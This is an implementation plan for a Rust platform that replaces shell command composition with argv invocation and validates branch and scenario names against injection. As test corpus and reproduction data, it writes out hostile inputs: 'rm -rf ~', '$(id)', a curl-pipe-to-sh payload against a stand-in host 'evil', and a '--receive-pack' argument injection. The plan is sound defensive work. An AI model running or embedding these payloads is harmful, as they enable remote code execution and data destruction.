# What an Action May Name — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: use
> `superpowers:subagent-driven-development` or
> `superpowers:executing-plans`. Steps use checkbox (`- [ ]`) syntax.
>
> **Structure note:** organized as **Arcs → Slices → Tasks** per
> `docs/design/README.md`.

**Goal:** No value that arrived from outside this platform — over the
wire or from the operator's keyboard — can be interpreted by anything.
An action's parameters are passed as arguments, never composed into a
command; a value that names a thing is checked against what that thing
can be; and a ninth action cannot be added without answering both
questions.

**Spec:**
`docs/design/specs/parallax/2026-08-21-what-an-action-may-name-design.md`,
signed off 2026-08-21 with all four questions answered.

**Architecture:** Four arcs, each its own PR, ordered so nothing is
built before the thing it carries. Arc 1 removes the interpreter, which
deletes the class outright and is the only arc that is strictly
necessary. Arc 2 narrows the values that survive it, which argv alone
does not do. Arc 3 installs the classification that stops the question
being skipped again. Arc 4 documents and verifies on the real three.

Arcs 1–3 need no second machine and no network: a runner is a function
from an invocation to a recording, a name is a function from a string to
a `Result`, and `ScriptedRunner` already exists. Nothing needs a
Raspberry Pi until Arc 4.

**Tech Stack:** Rust (stable, 2021 edition). **No new dependencies.**
The `git check-ref-format` grammar is encoded, not shelled out to —
shelling out to validate a value in order to avoid shelling out with it
is a circle, and the grammar is a dozen rules.

---

## Global Constraints

**Argv is necessary and not sufficient, and the two halves have
different justifications.** Arc 1 closes shell metacharacters. Arc 2's
`BranchName` closes argument injection, which survives argv — a branch
called `--receive-pack=...` is one of `git push`'s own flags. Arc 2's
`ScenarioName` closes **nothing**: its justification is typo-catching
and honest failure. Per the spec, do not defend it as security. A check
defended as security when it is not is one nobody can later reason about
removing.

**Tier 2 keeps its shell, and this is not a gap.** A manifest's
`verification[].command` is trusted as code because it is code. SESH
declares `cd surfaces && npm test && npm run build`, which is a shell
script. Task 2 asserts it still runs, with that real command as the
case, so the exemption is verified rather than assumed. The spec's Q4
answer records why this is not revisited.

**`format!` was never the defect.** The refspec `{b}:{b}` stays a
`format!` in Arc 1 and that is correct — it produces one argv element.
What was wrong was `format!` into something an interpreter reads. Task 4
records this so a later reader does not "fix" it.

**The executing machine decides; the cockpit's check is never the only
one.** Same rule as `authorize`. Task 14 is the test that deletes the
cockpit's check and asserts the refusal still lands — without it the
cockpit's copy is indistinguishable from the only copy.

**No action may be `Open`.** `Reach` is an exhaustive match, so a ninth
action does not compile until it has answered. Task 16 asserts every
current member is `Named`.

**Action fingerprints are ephemeral, so narrowing a field is safe.**
`fingerprint(action)` is computed per request and compared within it;
nothing persists one. The `fingerprint` *stored* in `rulings.jsonl` is a
Plumb finding's, a different value on a different type, and is
untouched. Stated here because "changing a hashed field" reads alarming
and is not.

**No wall clock and no network in any test**, inherited unchanged from
the previous two arcs.

**With `strict` now required alongside `gate`, an arc's PR must be up to
date with `main` before it merges.** `gh pr update-branch <n>`. Four
arcs merging in sequence means arcs 2–4 will each need it.

---

## Decided before Arc 2: the seam is dirty, so the character class wins

The spec's Q1 answer is *resolve through the seam the manifest's
`config:` field already names, and fall back to a character class if
that seam is not clean.* **It is not clean. Taking the fallback.**

The evidence, checked before planning rather than during implementation:

- `baseline/src/adapters/verification.rs:3` states it as a property of
  the family, in a module doc: **"Neither links Plumb"** — the `plumb`
  adapter reads the `verdict.md` Plumb writes, *as text*.
- `Validated::plumb_config` (`baseline/src/validate.rs:94`) returns a
  `PathBuf` and nothing more. Its only consumer in the entire crate is
  `plumb_runs_dir` (`baseline/src/adapters/factory.rs:58`), which takes
  the path's **parent directory** and never opens the file — and its
  doc calls even that "a convention rather than a declaration."

So the `config:` field is a seam that hands baseline a *path*, under a
stated rule that baseline does not read what is behind it. Resolving a
scenario name would mean parsing Plumb's YAML in baseline: a second
reader of a format `plumb` owns, and therefore a second place to be
right about it — exactly the trap the sign-off names, and against a
boundary a module doc holds deliberately.

Reaching past the seam is the one thing the answer forbids. So
`ScenarioName` is a character class (Task 10), and the refusal names the
scenario without claiming to know whether it exists.

**What remains available, as a different arc:** Plumb could *declare*
its scenario list through an interface baseline can read without parsing
YAML. That is a Plumb capability, belongs under `plumb/`, and would let
the resolution be added later without moving this boundary. It is out of
scope here and is not a deferred task — it is a thing that may never be
wanted, since the check it would strengthen is typo-catching.

---

## File Structure

```
baseline/src/adapters/
  verification.rs     ShellRunner + ProcessShellRunner + ScriptedShellRunner
                      (tier 2 only); ProgramRunner + ProcessProgramRunner
                      + ScriptedProgramRunner + Invocation beside them
  factory.rs          executor_for takes the program runner, not the shell
baseline/src/actions/
  names.rs       NEW  BranchName, ScenarioName, validating Deserialize
  process.rs          LocalProcessControl builds argv; two format! calls go
                      (one survives, as a single refspec argument)
  mod.rs              Reach, Action::reach, narrowed field types, re-exports
  wire.rs             narrow types parse at the edge; refusal by name
  executor.rs         passes narrowed types through; no logic change
baseline/tests/
  action_argv.rs NEW  the corpus properties, the reproduction, and the
                      tier-2 exemption asserted beside the rule (Arc 1)
  action_reach.rs NEW every action is Named (Arc 3)
probe/src/
  control.rs          the refusal path for a name this machine rejects
probe/
  README.md           the three trust tiers, beside the control warning
panopticon/src/
  control/prompt.rs   complete() validates a typed answer, and says why
```

---

## Milestones

| # | Milestone | Done when |
|---|---|---|
| 1 | ✅ The shell is gone from the constructed path | The spec's reproduction runs `plumb` with a scenario argument that is one string, and executes nothing else |
| 2 | A name is a name | A branch beginning with `-` and a scenario outside the class are both refused, from the wire and from the keyboard |
| 3 | The question cannot be skipped | A ninth action fails to compile until it answers both axes |
| 4 | It runs for real | A capture triggered from the desktop against the Pi still runs, by name, and SESH's `surfaces` check still fails for its one reason |

---

## Arc 1: The shell leaves the constructed path

**Shipped.** Four revisions during implementation, recorded below where
they apply. The third is the one that mattered.

### Slice 1.1: Two runners where there was one

#### Task 1: `ShellRunner` and `ProgramRunner`

The rename is half the documentation: after it, every call site says
which tier it is on.

**Revised during implementation: the names are symmetric.** This task
said `ScriptedProgramRunner` would sit "beside `ScriptedRunner`", which
would have left the tier-2 pair unnamed for its tier — and a
`ScriptedRunner` next to a `ScriptedProgramRunner` does not say which
tier it is on, which is this task's own stated purpose. Shipped as two
matched pairs: `ShellRunner` with `ProcessShellRunner` and
`ScriptedShellRunner`, `ProgramRunner` with `ProcessProgramRunner` and
`ScriptedProgramRunner`. The extra churn is one `sed` across eight
files; the asymmetry would have been permanent.

`Invocation { program, args }` was added as the recorded type rather
than a tuple. A test asserting an invocation is asserting *how many
arguments there were*, which is the whole property, and a named type
makes that assertion readable.

- [x] Rename `CommandRunner` → `ShellRunner`, unchanged in behaviour. Its doc says it is for tier-2 values only and names the tier.
- [x] `ProgramRunner` — `run(&mut self, program: &str, args: &[&str], cwd: &Path) -> io::Result<CommandOutput>`. Real impl is `std::process::Command::new(program).args(args)`. **No shell on any platform**, which also ends the `cfg!(windows)` fork for this path.
- [x] `ScriptedProgramRunner` beside `ScriptedRunner`, recording `(program, args, cwd)` so a test asserts an invocation without performing it.
- [x] Both runners' docs cross-reference, so a reader arriving at either learns the other exists and why.

#### Task 2: The verification adapter keeps its shell, provably

- [x] `VerificationAdapter` continues to use `ShellRunner`; no behaviour change.
- [x] Test named for the exemption: SESH's real `cd surfaces && npm test && npm run build` reaches the shell intact, as one string. The tier-2 exemption is verified rather than assumed.

### Slice 1.2: `LocalProcessControl` builds argv

#### Task 3: `capture` becomes an invocation

- [x] `LocalProcessControl` holds a `ProgramRunner`. There is **no constructor that gives it a `ShellRunner`** — the structural half of the arc.
- [x] `capture(project, Some(s))` → `("plumb", ["capture", "--scenario", s])`.
- [x] `capture(project, None)` → `("plumb", ["capture", "--all"])`.
- [x] `with_plumb` still names the binary for a checkout that has not installed it.

#### Task 4: `push` becomes an invocation

- [x] `push(project, branch)` → `("git", ["push", "origin", &format!("{branch}:{branch}")])`.
- [x] A comment records that the surviving `format!` is correct: it builds **one argv element**, and the defect was never string formatting but string formatting into an interpreter. Without this, a later reader removes it as a leftover.

#### Task 5: The existing assertions are rewritten, not deleted

- [x] `pushing_names_the_remote_and_both_ends_of_the_refspec` asserts the argv form. **The refspec decision it encodes is still correct** — a bare `git push` means whatever `push.default` says — and still needs a test.
- [x] `capturing_one_scenario_names_it` and `capturing_without_a_scenario_captures_every_one` likewise.
- [x] `every_command_runs_in_the_project_root` and the non-zero-exit test carry over to `ProgramRunner`.

### Slice 1.3: The property, and the reproduction

#### Task 6: No `Action` variant reaches a shell

The test the arc exists to make possible, and the shape
`tests/rendering.rs` already uses for escapes — a property, not three
habits.

**Revised during implementation: shape invariance was not enough, and
the property as planned would have passed a real regression.**

The plan's property was that a payload never changes an invocation's
*shape* — same program, same argument count. That is true and it is
half the claim. The half it misses was found by deliberately injecting
the most plausible regression rather than reasoning about it: re-joining
the arguments into a single `capture --scenario {s}`. That keeps the
program and the argument count identical for every payload, so the
shape property accepts it — and `sh -c` would have run both halves of
the payload again. Only the exact-assertion reproduction caught it.

So a second property was added: **an argument that carries an untrusted
value is built from that value and nothing else.** The refspec is the
one composition the platform performs, and it is named in a list rather
than pattern-matched, so a second composition has to be added
deliberately. With both properties in place the injected regression
fails three tests instead of one.

Worth stating as a general lesson, since it will recur in Arc 2: a
property test is only as good as the regression someone actually tried
against it. Writing the property and watching it pass is not evidence.

**Also revised:** the test file is `baseline/tests/action_argv.rs`, not
`action_reach.rs`. `Reach` arrives in Arc 3, and naming an Arc 1 file
for a type that does not exist yet would have read as a forward
reference nobody could follow. Arc 3's tests get `action_reach.rs`.

- [x] A hostile corpus: `; rm -rf ~`, `$(id)`, backticks, `| sh`, `&& curl`, newline, NUL, a leading `-`, `../..`, and a benign control for contrast.
- [x] The property, over **every `Action` variant and every string field**: under a recording `ProgramRunner`, each corpus value either appears as exactly one complete argv element or is refused before execution — and no `ShellRunner` is invoked on any path.
- [x] Exhaustive over the variant list by construction, so a ninth action joins the corpus without anyone remembering to add it.

#### Task 7: The reproduction becomes a regression test

- [x] Named for the finding, carrying the spec's payload verbatim: a `TriggerCapture` whose scenario is `cockpit-work; curl -s http://evil/x.sh | sh`, built through `ActionRequest::new` so the shape stays the platform's own.
- [x] Asserts the whole payload arrives as **one** argument to `plumb`, and that nothing else runs.
- [x] After Arc 2 this same input is refused earlier, by name. The test is updated then, not weakened — Task 11 says so.

---

## Arc 2: A name is checked against what it can be

### Slice 2.1: `BranchName`

#### Task 8: The type

- [ ] `BranchName` in `actions/names.rs`, with a `TryFrom<String>` / `FromStr` that encodes `git check-ref-format`'s rules: no `..`, no ASCII control characters, no space, none of `~ ^ : ? * [ \`, no leading or trailing `/`, no `//`, no trailing `.`, no `.lock` suffix, not the single character `@`.
- [ ] **Plus the rule git's grammar does not have: must not begin with `-`.** This is the one genuine injection defence left after Arc 1, and its doc says so explicitly rather than sitting in a list of hygiene rules.
- [ ] Validating `Deserialize`, so the narrow type is what `Action` holds and a hostile value never becomes one.
- [ ] `Display`, `PartialEq`, `Eq`, `Clone`, `Debug`, `Serialize` — whatever `Action`'s derives require.

#### Task 9: The leading dash is its own test

- [ ] Test: `--receive-pack=/tmp/x` is refused, **named for the reason argv alone would have let it through**. Separate from the metacharacter cases, because it is a separate class and a reader should not have to infer that.
- [ ] Test: ordinary branch names — `main`, `worktree-arc-3`, `spec/what-an-action-may-name`, `release/1.2` — all pass. The validator must not be a blanket refusal wearing a rule.
- [ ] The refusal quotes the rule it broke, not just the value.

### Slice 2.2: `ScenarioName`

#### Task 10: The type, and the honesty about what it is for

- [ ] `ScenarioName` — a character class: ASCII alphanumerics, `-`, `_`, `.`; non-empty; bounded length; no leading `-`.
- [ ] Its doc records **both** halves of the sign-off: that resolution was the preferred answer, that the seam was found dirty (with the `verification.rs:3` and `factory.rs:58` citations), and that **typo-catching, not injection, is what this check is for** — argv already removed that class.
- [ ] Validating `Deserialize`, same shape as `BranchName`.

#### Task 11: What the refusal says, and the reproduction moves

- [ ] Test: a scenario outside the class is refused, and the message **names the scenario** — matching the existing ``no project `ttui` on this machine`` shape rather than inventing a second voice for refusals.
- [ ] Test: `cockpit-work` and the six other real scenario names all pass.
- [ ] Task 7's reproduction is updated: the payload is now refused at parse rather than reaching `plumb` as one argument. **Updated, not weakened** — the assertion becomes stronger, and the test keeps its name so the finding stays findable.

### Slice 2.3: The boundary is where parsing happens

#### Task 12: The wire parses into narrow types

- [ ] `Action`'s `scenario` and `branch` fields become `Option<ScenarioName>` and `BranchName`.
- [ ] A hostile `ActionRequest` therefore **fails to deserialize**, before any executor exists to refuse it — the narrowest possible boundary.
- [ ] Test: the refusal is a parse error naming the field and the rule, not a generic serde message an operator cannot act on.
- [ ] Unknown fields stay ignored, per the wire's existing rule; this changes what a *known* field may contain, not the tolerance rule.

#### Task 13: The probe refuses by name

- [ ] `probe/src/control.rs` renders a rejected name as a refusal carrying the reason, on the same path as an unknown project.
- [ ] Test: `POST /action` with a bad branch returns a refusal naming the rule, and **the body is never handed to an executor**.

#### Task 14: The keyboard is tier 3

- [ ] `complete` (`panopticon/src/control/prompt.rs:161`) parses the typed answer into `BranchName` rather than moving a `String`.
- [ ] The prompt gains a refusal outcome: an invalid answer is **not** silently cancelled and not re-asked. Re-asking trains an operator to stop reading the question — the rule already argued at `prompt.rs:151`. It reports the rule the answer broke and ends the prompt.
- [ ] **Test: with the cockpit's check removed, the probe still refuses.** This is the test that makes Q3's answer a property rather than a convention, and it is not optional.
- [ ] Test: a pasted payload at `push which branch` is refused locally *and* would have been refused remotely — the two paths are the same tier and the test says so.

---

## Arc 3: The question cannot be skipped again

### Slice 3.1: `Reach`

#### Task 15: The second axis

- [ ] `Reach { Named, Open }` in `actions/mod.rs`, documented as *what a caller may cause this action to name* — beside `Reversibility`, which stays untouched.
- [ ] `Action::reach(&self) -> Reach` as an **exhaustive match**, no wildcard arm. A ninth action does not compile until it has answered.
- [ ] Its doc states the rule the enum exists to enforce: **no action may be `Open`.** `Open` is not a tier requiring confirmation — confirmation is a typo guard against a remote caller, so gating on it would be gating with a lock this repo has documented as unlocked. It is a state the platform refuses to be in.

#### Task 16: Every action is `Named`

- [ ] Test, exhaustive over the variant list: every action reports `Named`.
- [ ] Test asserting the wildcard's absence in the shape of the existing compile-fail guards, so the exhaustiveness is a property rather than a habit.
- [ ] `DispatchAgentRun` and `StopAgentRun` are `Named` **because their strings will be passed as arguments**, not because `dispatch`/`stop` currently return `Unsupported`. The doc says so: safe-by-deferral is not the claim being made, and the harness arc must not be able to read it as one.

  **Half of this landed early, in Arc 1.** The note belongs on `Reach`
  and still does — but a harness author reads `dispatch` first, and
  would have met its deferral comment with no warning attached to it.
  So `LocalProcessControl::dispatch` now carries the other half: being
  unimplemented is not what makes `prompt` safe, no validator can
  narrow free text, and what contains it is that it is passed as one
  argument to a program. Arc 3 still owes the `Reach` half.

---

## Arc 4: Close-out

#### Task 17: The trust tiers, written where they are needed

- [ ] `probe/README.md` gains the three tiers — compiled in, checked in, arrived — beside the existing `--allow-control` warning, which is where an operator deciding whether to turn control on is actually reading.
- [ ] It states plainly that **the operator's keyboard is tier 3**, since that is the half nobody expects.
- [ ] `baseline/README.md`'s adapter section notes the two runners and which tier each serves.

#### Task 18: The refusal is looked at

- [ ] A Plumb scenario capturing the prompt's refusal after an invalid branch name. It is new text on screen, and this platform judges its own interface.
- [ ] The scenario's `intent` names what a reader should be able to tell: which rule was broken, and that the action did not happen.

#### Task 19: It runs on the real three

- [ ] From the desktop, `TriggerCapture` by name against the Pi's `sesh` — still runs. **The arc must not close the capability it is narrowing.**
- [ ] A real `Push` of a real branch, confirmed at the prompt, still pushes.
- [ ] SESH's `surfaces` check still runs and still fails for the one reason it is written to fail for.
- [ ] The spec's reproduction, against a probe started with `--allow-control`: refused. And against the pre-arc binary: executed. **Both demonstrated**, so the change is shown rather than asserted.

---

## Spec coverage

| Spec section | Task |
|---|---|
| A parameter is not a command. The fix is argv, not escaping | 1, 3, 4 |
| Trust is a property of where a value came from | 2, 14, 17 |
| A value that names a thing is validated as a name of that thing | 8, 9, 10, 11, 12 |
| Reach is a second axis, and every action must answer it | 15, 16 |
| One property, not three habits | 6, 7 |
| The two unimplemented actions are why this comes first | 16 |
| Q1 — resolve through the seam, or fall back | Decided above; 10 |
| Q3 — the executing machine decides | 13, 14 |
